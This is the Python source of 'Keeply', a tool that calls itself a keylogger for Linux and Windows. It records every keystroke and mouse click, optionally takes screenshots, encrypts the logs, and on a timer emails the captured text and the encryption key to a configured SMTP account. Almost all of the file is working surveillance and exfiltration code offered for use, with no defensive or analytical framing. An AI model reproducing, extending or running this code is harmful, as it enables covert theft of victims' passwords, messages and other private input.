from kodules.modules_keeply import LASTINPUTINFO, Timing, Temporary_Directory, Cryptography, Screenshots, EMAIL, installation
from argparse import ArgumentParser
from datetime import datetime
from platform import system
from time import sleep
import os
import sys
import time
from ctypes import Structure, windll, c_uint, sizeof, byref

try:
    if system() == 'Linux':
        if not os.geteuid() == 0:
            sys.exit('Keeply must be run as root')
    elif system() == 'Windows':
        os.system('color a')
    print(f'\nSetting to {system()}')
except OSError:
    os.system('cls' if os.name == 'nt' else 'clear')
    sys.exit('OS not supported')

# GLOBAL VARIABLES BEFORE ASSINAGMENT
keys = []

#########################################################################
'''
FUNCTIONS
'''
#########################################################################


def parserArguments():
    # parser and group
    description = 'Keeply: keylogger for linux and windows with crypted messages to email and decrypted function.'
    parser = ArgumentParser(description=description,
                            epilog='Made by Y4rd13.')
    group = parser.add_mutually_exclusive_group()

    # CORES
    parser.add_argument('-i', '--installation', action='store_true',
                        help='Install core packages')  # installation

    # TRANSFER
    parser.add_argument('-tr', '--transfer', type=str, metavar='', help='Transfer method: fpt, email, usb, hdd',
                        choices=(['fpt', 'email', 'usb', 'hdd']))
    parser.add_argument('-temp', '--temporary_file', type=bool, metavar='',
                        help='Creates a temporary directory with logs.txt [True, default: False] (recommended to encrypt the data --encrypt)', default=False)

    # SERVER
    parser.add_argument('-u', '--user', type=str, metavar='',
                        help='Username (mail)')  # user (mail)
    parser.add_argument('-p', '--password', type=str,
                        metavar='', help='Username passowrd')  # password
    # port: 465 standar port to ssl (router can block the conection).
    parser.add_argument('--port', type=int, metavar='',
                        help='SMTP port (default=465)', default=465)
    parser.add_argument('--smtp', type=str, metavar='',
                        help='SMTP mail (default=smtp.gmail.com)', default='smtp.gmail.com')  # smtp

    # MESSAGE SETTINGS
    parser.add_argument('--encrypt', type=bool, metavar='',
                        help='Encrypt message with key: True (default: False)', default=False)
    parser.add_argument('-l', '--lines', type=int, metavar='',
                        help='Max lines to send (default=5)', default=5)  # ten lines
    parser.add_argument('-t', '--timer', type=int, metavar='',
                        help='Set a timer to transfer in minutes (min: 1; default=10)', default=10)
    parser.add_argument('-ss', '--screenshot', type=str, metavar='',
                        help='Enable Screenshot: click, key, keyword', choices=(['click', 'key', 'keyword']))  # screenshot
    group.add_argument('--start', action='store_true',
                       help='Initialize keeylogger')

    # DECRYPTH
    parser.add_argument('-K', '--key', type=str, metavar='',
                        help='Key to decrypth')  # cryptography key
    parser.add_argument('-F', '--filename', type=str, metavar='',
                        help='Directory ../filename.txt with encrypted text')  # encrypted filename
    group.add_argument('--decrypth', action='store_true',
                       help='Decrypth the message')

    return parser.parse_args()


# TRANSFER METHODS # class?
def transfer_method(funct_method, message):
    if funct_method == 'email':
        EMAIL(message=message, user=args.user).send_mail(password=args.password,
                                                         smtp_mail=args.smtp, port=args.port, args_temporary_file=args.temporary_file)

# KEYBOARD CAPTURE


def write_keys(keys):
    global message_keys, KEY
    global caps_lock_press
    global capt_sec_state, future_time
    global TIMES_PASSED

    MAX_CHAR = 147 * args.lines
    LEN_CHAR = 142  # time + message (one line) = 147 characteres
    seconds = Timing().get_sec()
    time_str = datetime.now().strftime('%X')

    if capt_sec_state == False:
        message_keys += (f'\n{time_str}\t')
        future_time = (seconds + 600)
        capt_sec_state = True
    elif capt_sec_state == True:
        if seconds >= future_time:
            message_keys += (f'\n\n{time_str}\n')
            capt_sec_state = False

    for key in keys:
        k = str(key).replace("'", "")
        Screenshots(key_str=k, method=args.screenshot).capture(user=args.user, password=args.password,
                                                               smtp_mail=args.smtp, port=args.port,
                                                               args_temporary_file=args.temporary_file)
        print(len(message_keys), MAX_CHAR, TIMES_PASSED)
        if k.find('space') > 0:
            message_keys += ' '
        elif k.find('Key.caps_lock') == 0:
            caps_lock_press += 1
        elif k.find('Key') == -1:
            if caps_lock_press == 1:
                message_keys += (k.upper())
            elif caps_lock_press == 2:
                message_keys += (k)
                caps_lock_press = 0
            else:
                if len(message_keys) == (LEN_CHAR * TIMES_PASSED):
                    message_keys += f'\n{time_str}\t'
                    TIMES_PASSED += 1
                else:
                    message_keys += (k)
    if (len(message_keys)) >= MAX_CHAR:
        queue.put(message_keys)
        message_keys = ' '


def write_special_keys(keys):
    global message_special
    for key in keys:
        k = str(key).replace("'", "")
        Screenshots(key_str=k, method=args.screenshot).capture(user=args.user, password=args.password,
                                                               smtp_mail=args.smtp, port=args.port,
                                                               args_temporary_file=args.temporary_file)
        message_special += (k + ' ')


def on_press(key):
    global keys
    keys.append(key)
    write_keys(keys)
    write_special_keys(keys)
    keys = []


def on_click(x, y, button, pressed):
    print('{0} at {1}'.format(
        'Pressed' if pressed else 'Released',
        (x, y)))

#########################################################################


def timer(counter_time=0):
    while True:
        time.sleep(0.5)
        counter_time += 0.5
        print(counter_time)
        if (int(counter_time) >= 60) and (int(counter_time) == (args.timer * 60)):
            event.set()
            counter_time = 0


def threadings():
    # Initialize threads
    keyboard_thread = keyboard.Listener(on_press=on_press)
    mouse_thread = mouse.Listener(on_click=on_click)
    #idle_thread = executor.submit(get_idle_duration)
    idle_thread = Thread(target=timer)

    # Start threads
    keyboard_thread.start()
    mouse_thread.start()
    idle_thread.start()

    while True:
        message_keys = queue.get()
        if message_keys != '':
            event.wait()
            if args.encrypt:
                encrypted_text = (Cryptography().enrcypt_message(
                    KEY=KEY, message=message_keys)).decode()
                print('Encrypted')
                transfer_method(funct_method=args.transfer,
                                message=f'''
                \n\n{Timing().date_funct()}\n{encrypted_text}
                ''')
            else:
                transfer_method(funct_method=args.transfer,
                                message=f'\n\n{Timing().date_funct()}\n{message_keys}')
            event.clear()


#########################################################################
#########################################################################
'''
NAME == MAIN
'''
#########################################################################
#########################################################################
if __name__ == "__main__":
    # ARGPARSER
    args = parserArguments()

    if len(sys.argv) > 1:
        # INSTALLATION
        if args.installation:
            initialize_import = installation()
        try:
            from pynput import keyboard
            from pynput import mouse

            from threading import Thread, Event
            event = Event()
            from concurrent.futures import ThreadPoolExecutor
            executor = ThreadPoolExecutor()
            from queue import Queue
            queue = Queue()

            from tqdm import tqdm

            print('\nCorrectly imported.')
            for __ in tqdm(range(100)):
                sleep(0.015)
            os.system('cls' if os.name == 'nt' else 'clear')
        except ImportError as Import_Error:
            print('Import Error: ', Import_Error)

        # WRITE_KEYS VARIABLES
        TIMES_PASSED = 1
        caps_lock_press = 0
        capt_sec_state, future_time = False, 0
        message_keys, message_special = ' ', ''

        # START AND DECRYPTH
        try:
            if args.start:
                if args.encrypt == True:
                    KEY = Cryptography().cipher_key()
                    EMAIL(message=f'\n\nKEY:\n{KEY.decode()}', user=args.user).send_mail(password=args.password,
                                                                                         smtp_mail=args.smtp, port=args.port,
                                                                                         args_temporary_file=args.temporary_file)
                    print('\nYour KEY was sent successfully\n')
                if args.screenshot in ['key', 'keyword']:
                    print(
                        f'Input your predefine {(args.screenshot).upper()} to take screenshots:')
                elif args.screenshot == ['click']:
                    print(f'{(args.screenshot).upper()} will take screenshots')

                threadings()  # MAIN
            elif args.decrypth:
                input_key = args.key
                encrypted_file = args.filename
                with open(encrypted_file, 'r') as encrypted_data:
                    encrypted_data = bytes(
                        encrypted_data.read(), encoding='utf-8')
                    decrypted_data = Cryptography().decrypted_message(
                        encrypted_text=encrypted_data, KEY=input_key)
                    print(decrypted_data)
                for __ in tqdm(range(30)):
                    sleep(1)
        except KeyboardInterrupt:
            os.system('cls' if os.name == 'nt' else 'clear')
            sys.exit(0)
    else:
        try:
            print('\n\tTo see how to use keeply: keeply.py [-h] --help.')
            time.sleep(10)
            os.system('cls' if os.name == 'nt' else 'clear')
            sys.exit(0)
        except KeyboardInterrupt:
            os.system('cls' if os.name == 'nt' else 'clear')
            sys.exit(0)
